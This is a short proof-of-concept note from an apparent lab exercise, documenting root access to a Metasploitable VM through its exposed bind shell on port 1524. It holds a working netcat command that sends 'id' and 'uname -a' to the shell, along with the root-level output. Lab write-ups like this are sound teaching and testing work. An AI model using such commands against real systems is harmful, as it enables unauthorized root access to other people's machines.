# Metasploitable Bind Shell PoC

Date: `2026-06-28`

## Target

- `10.77.0.3:1524`

## Execution

Run from Kali through VirtualBox guest control:

```bash
printf "id\nuname -a\nexit\n" | nc -nv 10.77.0.3 1524
```

## Correction

The first post-exploitation check used `ip -br addr`, which this Metasploitable build does not support. The final evidence uses `whoami`, `id`, `hostname`, and `ifconfig` for a stable result.

## Result

- Connected to `root@metasploitable:/#`
- `id` returned `uid=0(root) gid=0(root) groups=0(root)`
- `uname -a` returned the Metasploitable kernel/version string

## Impact

The exposed bind shell provides direct root-level remote command execution on the lab target with no authentication.
